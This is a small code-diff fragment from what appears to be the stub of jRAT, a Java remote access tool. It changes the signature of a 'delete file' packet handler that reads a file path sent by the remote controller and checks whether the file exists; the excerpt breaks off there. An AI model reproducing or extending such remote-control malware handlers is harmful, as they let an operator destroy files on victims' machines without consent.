@@ -8,7 +8,7 @@ import se.jrat.stub.Connection;
 public class Packet16DeleteFile extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		String file = Connection.instance.readLine();
 		File f = new File(file);
 		if (f.exists()) {
